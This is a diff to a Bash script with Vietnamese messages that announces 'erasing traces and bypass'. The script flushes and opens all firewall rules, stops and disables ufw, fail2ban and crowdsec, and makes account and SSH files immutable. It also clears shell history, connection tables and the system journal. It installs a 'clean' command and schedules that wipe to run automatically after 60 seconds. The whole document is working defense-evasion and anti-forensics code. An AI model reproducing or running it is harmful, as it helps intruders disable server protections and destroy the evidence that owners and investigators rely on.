@@ -1,8 +1,5 @@
 #!/bin/bash
-
-
 echo -e "Xóa dấu vết và bypass"
-
 echo "[+] Bật chế độ bypass"
 sysctl -w net.core.rmem_max=134217728 &>/dev/null
 sysctl -w net.core.wmem_max=134217728 &>/dev/null
@@ -21,13 +18,13 @@ sysctl -w fs.file-max=2097152 &>/dev/null
 ulimit -n 999999 2>/dev/null
 echo "* soft nofile 999999" >> /etc/security/limits.conf
 echo "* hard nofile 999999" >> /etc/security/limits.conf
-
+chattr +i /etc/passwd /etc/shadow /etc/ssh/sshd_config
 iptables -F && iptables -X && iptables -t nat -F && iptables -t mangle -F
 iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT
 nft flush ruleset &>/dev/null
 systemctl stop ufw fail2ban crowdsec &>/dev/null
 systemctl disable ufw fail2ban crowdsec &>/dev/null
-
+chattr +i /etc/passwd /etc/shadow /etc/ssh/sshd_config /etc/hosts.deny 2>/dev/null
 clean() {
     echo "[!] Đang dọn dấu vết 100%..."
     history -c; echo "" > /root/.bash_history
@@ -38,12 +35,10 @@ clean() {
     conntrack -F &>/dev/null; ip neigh flush all &>/dev/null
     iptables -Z -t filter; iptables -Z -t nat; iptables -Z -t mangle; iptables -Z -t raw
     journalctl --rotate --vacuum-time=1s &>/dev/null
-    echo "[+] Đã sạch hoàn toàn - không tìm thấy gì!"
+    echo "[+] Đã sạch hoàn toàn"
 }
-
 # Tự động dọn sau 15 phút nếu không tắt
 (sleep 60 && clean) &
-
 echo "clean" > /usr/bin/clean && chmod +x /usr/bin/clean
 cat > /usr/bin/clean <<'EOF'
 #!/bin/bash
@@ -51,6 +46,5 @@ $(declare -f clean)
 clean
 EOF
 chmod +x /usr/bin/clean
-
 echo -e "\033[1;36m[+] Gõ 'clean' bất kỳ lúc nào để xóa sạch dấu vết ngay lập tức!\033[0m"
-echo -e "\033[1;31m    Server sẽ tự động sạch sau 60 giây.\033[0m\n"
+echo -e "\033[1;31m Server sẽ tự động sạch sau 60 giây.\033[0m\n"
